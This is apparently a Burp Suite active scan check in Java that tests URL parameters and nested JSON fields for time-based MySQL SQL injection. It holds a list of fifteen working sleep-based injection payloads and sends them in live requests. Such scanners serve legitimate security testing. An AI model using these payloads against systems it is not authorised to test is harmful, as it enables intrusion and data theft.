id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: MySQL Time-Based Active Scan Alex
function: SCAN_CHECK_ACTIVE_PER_INSERTION_POINT
location: SCANNER
source: |

/**
 * Detects time-based MySQL SQL injection - runs once per request.
 * Iterates through ALL URL parameters directly (like the Repeater version).
 * Handles both regular parameters and JSON-encoded parameters in GET requests.
 * Tests empty JSON fields as both strings and arrays.
 * Uses custom URL encoding for full control.
 * @author slicingmelon
 * FIXED: Improved exception handling to prevent burp.Zn0n errors
 **/

// Configurable sleep time (in seconds)
var DEFAULT_SLEEP_TIME = 5;
var SLEEP_PLACEHOLDER = "§§§SLEEP_TIME§§§";

// Set to true to log expected errors during payload testing (network timeouts, etc.)
// Set to false to suppress these expected errors and reduce log noise
var LOG_EXPECTED_ERRORS = false;

var payloadTemplates = java.util.List.of(
  "'XOR(if(isnull(nullif(now(),sysdate())),sleep(§§§SLEEP_TIME§§§),0))XOR'Z",
  "'(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)'",
  "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
  "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
  "-(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
  ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
  ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
  "'AND(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)AND'Z",
  " AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
  "' AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
  ") AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
  "') AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
  "->test\"',(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'",
  "->test\"' ASC, (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)) DESC-- z\"'",
  "->test\"') XOR (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'"
);

// Build actual payloads by replacing placeholder with sleep time
var payloads = payloadTemplates.stream()
  .map(p -> p.replace(SLEEP_PLACEHOLDER, String.valueOf(DEFAULT_SLEEP_TIME)))
  .collect(java.util.stream.Collectors.toList());

// Detection threshold based on sleep time (in milliseconds)
var detectionThresholdMs = DEFAULT_SLEEP_TIME * 1000L;

// Custom URL encode - only encodes space, +, #, = (characters that break URL structure)
var customUrlEncode = (java.util.function.Function<String, String>)(str -> {
  return str.replace(" ", "%20")
            .replace("+", "%2b")
            .replace("#", "%23")
            .replace("=", "%3D");
});

// Helper function to minify JSON (smarter - respects string boundaries)
var minifyJson = (java.util.function.Function<String, String>)(jsonStr -> {
  var sb = new StringBuilder();
  boolean inString = false;
  for (int i = 0; i < jsonStr.length(); i++) {
    char c = jsonStr.charAt(i);
    if (c == '"' && (i == 0 || jsonStr.charAt(i - 1) != '\\')) {
      inString = !inString;
      sb.append(c);
      continue;
    }
    if (!inString && Character.isWhitespace(c)) {
      continue; // strip whitespace only outside strings
    }
    sb.append(c);
  }
  return sb.toString();
});

// Helper to detect JSON-looking strings (used for recursive parsing)
var looksLikeJsonString = (java.util.function.Predicate<String>)(str -> {
  if (str == null) return false;
  var trimmed = str.strip();
  if (trimmed.length() < 2) return false;
  char first = trimmed.charAt(0);
  char last = trimmed.charAt(trimmed.length() - 1);
  if ((first == '{' && last == '}') || (first == '[' && last == ']')) {
    try {
      return api().utilities().jsonUtils().isValidJson(trimmed);
    } catch (Exception ignored) {
      return false;
    }
  }
  return false;
});

// Helper to copy original JSON entries when building mutated variants
var copyJsonEntry = (java.util.function.BiConsumer<JsonObjectNode, java.util.Map.Entry<String, JsonNode>>)((dest, srcEntry) -> {
  var key = srcEntry.getKey();
  var valueNode = srcEntry.getValue();
  if (valueNode.isString()) {
    dest.putString(key, valueNode.asString());
  } else if (valueNode.isNull()) {
    dest.put(key, JsonNullNode.jsonNullNode());
  } else {
    dest.put(key, valueNode);
  }
});

// Helper to join nested JSON paths (handles array index notation)
var joinFieldPath = (java.util.function.BiFunction<String, String, String>)((base, suffix) -> {
  if (base == null || base.isEmpty()) return suffix;
  if (suffix == null || suffix.isEmpty()) return base;
  if (suffix.startsWith("[")) {
    return base + suffix;
  }
  return base + "." + suffix;
});

// Helper to format nested keys for array elements
var formatNestedKey = (java.util.function.Function<String, String>)(key -> {
  if (key == null || key.isEmpty()) return "";
  if (key.startsWith("[")) {
    return key;
  }
  return "." + key;
});

// Maximum depth for nested JSON mutations (prevent excessive mutations)
var MAX_NESTED_DEPTH = 3;

// Helper function to inject payload into a JSON string (recursive for nested structures)
var injectIntoJson = new java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String, String>>>() {
  @Override
  public java.util.List<java.util.Map.Entry<String, String>> apply(String jsonStr, String payload) {
    return applyWithDepth(jsonStr, payload, 0);
  }
  
  private java.util.List<java.util.Map.Entry<String, String>> applyWithDepth(String jsonStr, String payload, int depth) {
    var results = new java.util.ArrayList<java.util.Map.Entry<String, String>>();
    
    // Limit recursion depth to prevent excessive mutations
    if (depth >= MAX_NESTED_DEPTH) {
      return results;
    }
    
    try {
      var jsonNode = JsonNode.jsonNode(jsonStr);
      if (jsonNode.isObject()) {
        processObject(jsonNode.asObject(), payload, results, depth);
      } else if (jsonNode.isArray()) {
        processArray(jsonNode.asArray(), payload, results, depth);
      }
    } catch (Exception e) {
      if (LOG_EXPECTED_ERRORS) {
        try {
          logging().logToError("[MySQLTimeBased] Failed to parse JSON: " + e.getMessage());
        } catch (Throwable e2) {
          // If even logging fails, ignore silently
        }
      }
    }
    return results;
  }

  private void processObject(JsonObjectNode jsonObj, String payload, java.util.List<java.util.Map.Entry<String, String>> results, int depth) {
    var jsonMap = jsonObj.asMap();

    for (var entry : jsonMap.entrySet()) {
      String targetKey = entry.getKey();
      var targetValueNode = entry.getValue();

      if (targetValueNode.isString() || targetValueNode.isNull()) {
        handleStringField(jsonMap, targetKey, targetValueNode, payload, results, depth);
      }

      if (targetValueNode.isArray()) {
        handleArrayField(jsonMap, targetKey, targetValueNode.asArray(), payload, results, depth);
      }

      if (targetValueNode.isObject()) {
        handleObjectField(jsonMap, targetKey, targetValueNode.asObject(), payload, results, depth);
      }
    }
  }

  private void processArray(JsonArrayNode jsonArray, String payload, java.util.List<java.util.Map.Entry<String, String>> results, int depth) {
    int arraySize = jsonArray.asList().size();
    for (int i = 0; i < arraySize; i++) {
      var element = jsonArray.get(i);

      if (element.isString() || element.isNull()) {
        String originalValue = element.isString() ? element.asString() : "";
        var newArray = JsonArrayNode.jsonArrayNode();
        for (int j = 0; j < arraySize; j++) {
          if (j == i) {
            newArray.addString(originalValue + payload);
          } else {
            newArray.add(jsonArray.get(j));
          }
        }
        results.add(new java.util.AbstractMap.SimpleEntry<>(
          "[" + i + "]",
          minifyJson.apply(newArray.toJsonString())
        ));

        if (depth < MAX_NESTED_DEPTH && looksLikeJsonString.test(originalValue)) {
          var nestedMutations = this.applyWithDepth(originalValue, payload, depth + 1);
          for (var nestedMutation : nestedMutations) {
            var newArrayNested = JsonArrayNode.jsonArrayNode();
            for (int j = 0; j < arraySize; j++) {
              if (j == i) {
                newArrayNested.addString(nestedMutation.getValue());
              } else {
                newArrayNested.add(jsonArray.get(j));
              }
            }
            results.add(new java.util.AbstractMap.SimpleEntry<>(
              "[" + i + "]" + formatNestedKey.apply(nestedMutation.getKey()),
              minifyJson.apply(newArrayNested.toJsonString())
            ));
          }
        }
      } else if (element.isArray() || element.isObject()) {
        if (depth < MAX_NESTED_DEPTH) {
          var nestedMutations = this.applyWithDepth(element.toJsonString(), payload, depth + 1);
          for (var nestedMutation : nestedMutations) {
            try {
              var mutatedNode = JsonNode.jsonNode(nestedMutation.getValue());
              var newArray = JsonArrayNode.jsonArrayNode();
              for (int j = 0; j < arraySize; j++) {
                if (j == i) {
                  newArray.add(mutatedNode);
                } else {
                  newArray.add(jsonArray.get(j));
                }
              }
              results.add(new java.util.AbstractMap.SimpleEntry<>(
                "[" + i + "]" + formatNestedKey.apply(nestedMutation.getKey()),
                minifyJson.apply(newArray.toJsonString())
              ));
            } catch (Exception ignored) {
              // Skip malformed nested JSON
            }
          }
        }
      }
    }
  }

  private void handleStringField(java.util.Map<String, JsonNode> jsonMap, String targetKey, JsonNode targetValueNode, String payload, java.util.List<java.util.Map.Entry<String, String>> results, int depth) {
    String originalValue = targetValueNode.isString() ? targetValueNode.asString() : "";
    boolean isEmpty = originalValue.isEmpty();

    var newJsonObj = JsonObjectNode.jsonObjectNode();
    for (var e : jsonMap.entrySet()) {
      if (e.getKey().equals(targetKey)) {
        String origVal = targetValueNode.isString() ? targetValueNode.asString() : "";
        newJsonObj.putString(e.getKey(), origVal + payload);
      } else {
        copyJsonEntry.accept(newJsonObj, e);
      }
    }
    results.add(new java.util.AbstractMap.SimpleEntry<>(
      targetKey,
      minifyJson.apply(newJsonObj.toJsonString())
    ));

    if (isEmpty) {
      var newJsonObjArray = JsonObjectNode.jsonObjectNode();
      for (var e : jsonMap.entrySet()) {
        if (e.getKey().equals(targetKey)) {
          var payloadArray = JsonArrayNode.jsonArrayNode();
          payloadArray.addString(payload);
          newJsonObjArray.put(e.getKey(), payloadArray);
        } else {
          copyJsonEntry.accept(newJsonObjArray, e);
        }
      }
      results.add(new java.util.AbstractMap.SimpleEntry<>(
        targetKey + "[]",
        minifyJson.apply(newJsonObjArray.toJsonString())
      ));
    }

    if (depth < MAX_NESTED_DEPTH && !originalValue.isEmpty() && looksLikeJsonString.test(originalValue)) {
      var nestedMutations = this.applyWithDepth(originalValue, payload, depth + 1);
      for (var nestedMutation : nestedMutations) {
        var newJsonObjNested = JsonObjectNode.jsonObjectNode();
        for (var e : jsonMap.entrySet()) {
          if (e.getKey().equals(targetKey)) {
            newJsonObjNested.putString(e.getKey(), nestedMutation.getValue());
          } else {
            copyJsonEntry.accept(newJsonObjNested, e);
          }
        }
        results.add(new java.util.AbstractMap.SimpleEntry<>(
          joinFieldPath.apply(targetKey, nestedMutation.getKey()),
          minifyJson.apply(newJsonObjNested.toJsonString())
        ));
      }
    }
  }

  private void handleArrayField(java.util.Map<String, JsonNode> jsonMap, String targetKey, JsonArrayNode targetArray, String payload, java.util.List<java.util.Map.Entry<String, String>> results, int depth) {
    int arraySize = targetArray.asList().size();

    for (int i = 0; i < arraySize; i++) {
      var arrayElement = targetArray.get(i);

      if (arrayElement.isString() || arrayElement.isNull()) {
        var newJsonObj = JsonObjectNode.jsonObjectNode();
        for (var e : jsonMap.entrySet()) {
          if (e.getKey().equals(targetKey)) {
            var newArray = JsonArrayNode.jsonArrayNode();
            for (int j = 0; j < arraySize; j++) {
              var elem = targetArray.get(j);
              if (j == i) {
                String originalValue = elem.isString() ? elem.asString() : "";
                newArray.addString(originalValue + payload);
              } else {
                newArray.add(elem);
              }
            }
            newJsonObj.put(e.getKey(), newArray);
          } else {
            copyJsonEntry.accept(newJsonObj, e);
          }
        }
        results.add(new java.util.AbstractMap.SimpleEntry<>(
          targetKey + "[" + i + "]",
          minifyJson.apply(newJsonObj.toJsonString())
        ));

        String originalValue = arrayElement.isString() ? arrayElement.asString() : "";
        if (depth < MAX_NESTED_DEPTH && !originalValue.isEmpty() && looksLikeJsonString.test(originalValue)) {
          var nestedMutations = this.applyWithDepth(originalValue, payload, depth + 1);
          for (var nestedMutation : nestedMutations) {
            var newJsonObjNested = JsonObjectNode.jsonObjectNode();
            for (var e : jsonMap.entrySet()) {
              if (e.getKey().equals(targetKey)) {
                var newArray = JsonArrayNode.jsonArrayNode();
                for (int j = 0; j < arraySize; j++) {
                  if (j == i) {
                    newArray.addString(nestedMutation.getValue());
                  } else {
                    newArray.add(targetArray.get(j));
                  }
                }
                newJsonObjNested.put(e.getKey(), newArray);
              } else {
                copyJsonEntry.accept(newJsonObjNested, e);
              }
            }
            results.add(new java.util.AbstractMap.SimpleEntry<>(
              joinFieldPath.apply(targetKey + "[" + i + "]", nestedMutation.getKey()),
              minifyJson.apply(newJsonObjNested.toJsonString())
            ));
          }
        }
      } else if (arrayElement.isArray() || arrayElement.isObject()) {
        if (depth < MAX_NESTED_DEPTH) {
          var nestedMutations = this.applyWithDepth(arrayElement.toJsonString(), payload, depth + 1);
          for (var nestedMutation : nestedMutations) {
            try {
              var mutatedNode = JsonNode.jsonNode(nestedMutation.getValue());
              var newJsonObj = JsonObjectNode.jsonObjectNode();
              for (var e : jsonMap.entrySet()) {
                if (e.getKey().equals(targetKey)) {
                  var newArray = JsonArrayNode.jsonArrayNode();
                  for (int j = 0; j < arraySize; j++) {
                    if (j == i) {
                      newArray.add(mutatedNode);
                    } else {
                      newArray.add(targetArray.get(j));
                    }
                  }
                  newJsonObj.put(e.getKey(), newArray);
                } else {
                  copyJsonEntry.accept(newJsonObj, e);
                }
              }
              results.add(new java.util.AbstractMap.SimpleEntry<>(
                joinFieldPath.apply(targetKey + "[" + i + "]", nestedMutation.getKey()),
                minifyJson.apply(newJsonObj.toJsonString())
              ));
            } catch (Exception ignored) {
              // Skip malformed nested JSON
            }
          }
        }
      }
    }
  }

  private void handleObjectField(java.util.Map<String, JsonNode> jsonMap, String targetKey, JsonObjectNode targetObject, String payload, java.util.List<java.util.Map.Entry<String, String>> results, int depth) {
    if (depth < MAX_NESTED_DEPTH) {
      var nestedMutations = this.applyWithDepth(targetObject.toJsonString(), payload, depth + 1);
      for (var nestedMutation : nestedMutations) {
        try {
          var mutatedNode = JsonNode.jsonNode(nestedMutation.getValue());
          var newJsonObj = JsonObjectNode.jsonObjectNode();
          for (var e : jsonMap.entrySet()) {
            if (e.getKey().equals(targetKey)) {
              newJsonObj.put(e.getKey(), mutatedNode);
            } else {
              copyJsonEntry.accept(newJsonObj, e);
            }
          }
          results.add(new java.util.AbstractMap.SimpleEntry<>(
            joinFieldPath.apply(targetKey, nestedMutation.getKey()),
            minifyJson.apply(newJsonObj.toJsonString())
          ));
        } catch (Exception ignored) {
          // Skip malformed nested JSON
        }
      }
    }
  }
};

// Burp calls this once per REQUEST (not per insertion point)
var issues = new java.util.ArrayList();
var baseRequest = requestResponse.request();

if (baseRequest == null) return AuditResult.auditResult();

// Get ALL URL parameters directly (like the Repeater version)
var urlParameters = baseRequest.parameters().stream()
  .filter(p -> p.type() == HttpParameterType.URL)
  .collect(java.util.stream.Collectors.toList());

if (urlParameters.isEmpty()) {
  return AuditResult.auditResult();
}

// Iterate through each URL parameter
for (var parameter : urlParameters) {
  String name = parameter.name();
  String value = parameter.value();
  
  // Validate parameter name and value
  if (name == null || name.isEmpty() || value == null) continue;
  
  // URL decode the value to check if it's JSON
  var decodedValue = api().utilities().urlUtils().decode(value);
  
  // Check if it's JSON
  if (decodedValue != null && !decodedValue.isEmpty() && 
      decodedValue.strip().startsWith("{") && decodedValue.strip().endsWith("}") &&
      api().utilities().jsonUtils().isValidJson(decodedValue)) {
    
    // Handle JSON parameter - inject into each JSON field
    for (String payload : payloads) {
      // Validate payload before processing
      if (payload == null || payload.isEmpty()) continue;
      
      var jsonMutations = injectIntoJson.apply(decodedValue, payload);
      if (jsonMutations == null || jsonMutations.isEmpty()) continue;
      
      for (var jsonMutation : jsonMutations) {
        try {
          // Validate JSON mutation
          if (jsonMutation == null) continue;
          var jsonField = jsonMutation.getKey();
          var mutatedJson = jsonMutation.getValue();
          if (jsonField == null || mutatedJson == null || mutatedJson.isEmpty()) continue;
          
          // Encode mutated JSON once to keep URLs well-formed
          var encodedMutatedJson = api().utilities().urlUtils().encode(mutatedJson);
          if (encodedMutatedJson == null || encodedMutatedJson.isEmpty()) continue;
          
          // Create parameter with validation
          var newParam = HttpParameter.urlParameter(name, encodedMutatedJson);
          if (newParam == null) continue;
          
          // Work around Montoya's query parser quirks by removing + re-adding the parameter
          var mutatedRequest = baseRequest
            .withRemovedParameters(parameter)
            .withAddedParameters(newParam);
          if (mutatedRequest == null) continue;
          
          // Send request and validate response
          var result = http.sendRequest(mutatedRequest);
          if (result == null || !result.hasResponse()) continue;
          
          // Validate timing data
          var timingOpt = result.timingData();
          if (timingOpt == null || timingOpt.isEmpty()) continue;
          
          var timing = timingOpt.get();
          if (timing == null) continue;
          
          var tStart = timing.timeBetweenRequestSentAndStartOfResponse();
          var startMs = (tStart != null) ? tStart.toMillis() : -1;
          
          if (startMs >= detectionThresholdMs && startMs != -1) {
            logging().logToOutput(String.format(
              "[MySQLTimeBased] Detected delay %dms on JSON param '%s' field '%s' using payload '%s'",
              startMs, name, jsonField, payload));
            
            var detail = String.format("JSON param '%s' field '%s' with payload '%s' caused %dms delay", 
              name, jsonField, payload, startMs);
            
            try {
              logging().logToOutput("[DEBUG] Step 1: Creating issue for JSON field '" + jsonField + "'");
              
              // Validate URL before creating issue
              var requestUrl = mutatedRequest.url();
              if (requestUrl == null) continue;
              
              var issue = AuditIssue.auditIssue(
                "MySQL Time-Based SQL Injection (JSON) - " + jsonField,
                detail,
                "Use parameterized queries",
                requestUrl,
                AuditIssueSeverity.HIGH,
                AuditIssueConfidence.CERTAIN,
                "Background information",
                "Remediation details",
                AuditIssueSeverity.HIGH,
                result
              );
              
              if (issue == null) continue;
              
              logging().logToOutput("[DEBUG] Step 2: Issue created, adding to site map");
              
              // Add the request/response to siteMap (not the issue - siteMap.add takes HttpRequestResponse)
              api().siteMap().add(result);
              
              logging().logToOutput("[DEBUG] Step 3: Adding to issues list");
              issues.add(issue);
              
              logging().logToOutput("[DEBUG] Step 4: Success!");
            } catch (Throwable issueEx) {
              // If issue creation fails, log it but don't crash - catch Throwable to catch everything
              try {
                // Don't try to extract exception details - just log generic message
                logging().logToError("[MySQLTimeBased] Failed at issue creation for JSON field '" + jsonField + "'");
              } catch (Throwable e2) {
                // If even logging fails, ignore silently
              }
            }
          }
        } catch (Throwable e) {
          // Continue with next payload - errors during testing are expected (network issues, etc.)
          // Only log if LOG_EXPECTED_ERRORS is enabled
          if (LOG_EXPECTED_ERRORS) {
            try {
              logging().logToError("[MySQLTimeBased] Error on JSON payload, continuing");
            } catch (Throwable e2) {
              // If even logging fails, ignore silently
            }
          }
        }
      }
    }
  } else {
    for (String payload : payloads) {
      try {
        // Validate payload
        if (payload == null || payload.isEmpty()) continue;
        
        // Custom URL encode the payload (only space, +, #, =)
        var encodedPayload = customUrlEncode.apply(payload);
        if (encodedPayload == null) continue;
        
        // Validate name and value
        if (name == null || name.isEmpty() || value == null) continue;
        
        // Create new parameter with payload appended
        // Note: we intentionally do NOT encode the whole value again here because
        // HttpParameter.urlParameter() will encode it if it's raw characters.
        // But if we pre-encoded it, Montoya might double-encode.
        // The safest bet with Montoya is usually to pass raw strings if possible,
        // OR pass the exact encoded string but use the replacement trick.
        // Here we try passing the raw value+payload so Montoya encodes it correctly.
        var newParam = HttpParameter.urlParameter(name, value + payload);
        if (newParam == null) continue;
        
        // Work around Montoya's query parser quirks by removing + re-adding the parameter
        var mutatedRequest = baseRequest
          .withRemovedParameters(parameter)
          .withAddedParameters(newParam);
        if (mutatedRequest == null) continue;
        
        // Send request and validate response
        var result = http.sendRequest(mutatedRequest);
        if (result == null || !result.hasResponse()) continue;
        
        // Validate timing data
        var timingOpt = result.timingData();
        if (timingOpt == null || timingOpt.isEmpty()) continue;
        
        var timing = timingOpt.get();
        if (timing == null) continue;
        
        var tStart = timing.timeBetweenRequestSentAndStartOfResponse();
        var startMs = (tStart != null) ? tStart.toMillis() : -1;
        
        if (startMs >= detectionThresholdMs && startMs != -1) {
          logging().logToOutput(String.format(
            "[MySQLTimeBased] Detected delay %dms on param '%s' using payload '%s'",
            startMs, name, payload));
          
          var detail = String.format("Param '%s' with payload '%s' caused %dms delay", 
            name, payload, startMs);
          
          try {
            logging().logToOutput("[DEBUG] Step 1: Creating issue for param '" + name + "'");
            
            // Validate URL before creating issue
            var requestUrl = mutatedRequest.url();
            if (requestUrl == null) continue;
            
            var issue = AuditIssue.auditIssue(
              "MySQL Time-Based SQL Injection - " + name,
              detail,
              "Use parameterized queries",
              requestUrl,
              AuditIssueSeverity.HIGH,
              AuditIssueConfidence.CERTAIN,
              "Background information",
              "Remediation details",
              AuditIssueSeverity.HIGH,
              result
            );
            
            if (issue == null) continue;
            
            logging().logToOutput("[DEBUG] Step 2: Issue created, adding to site map");
            
            // Add the request/response to siteMap (not the issue - siteMap.add takes HttpRequestResponse)
            api().siteMap().add(result);
            
            logging().logToOutput("[DEBUG] Step 3: Adding to issues list");
            issues.add(issue);
            
            logging().logToOutput("[DEBUG] Step 4: Success!");
          } catch (Throwable issueEx) {
            // If issue creation fails, log it but don't crash - catch Throwable to catch everything
            try {
              // Don't try to extract exception details - just log generic message
              logging().logToError("[MySQLTimeBased] Failed at issue creation for param '" + name + "'");
            } catch (Throwable e2) {
              // If even logging fails, ignore silently
            }
          }
        }
      } catch (Throwable e) {
        // Continue with next payload - errors during testing are expected (network issues, etc.)
        // Only log if LOG_EXPECTED_ERRORS is enabled
        if (LOG_EXPECTED_ERRORS) {
          try {
            logging().logToError("[MySQLTimeBased] Error on payload, continuing");
          } catch (Throwable e2) {
            // If even logging fails, ignore silently
          }
        }
      }
    }
  }
}

// Return all issues found (or empty if none)
return AuditResult.auditResult(issues);

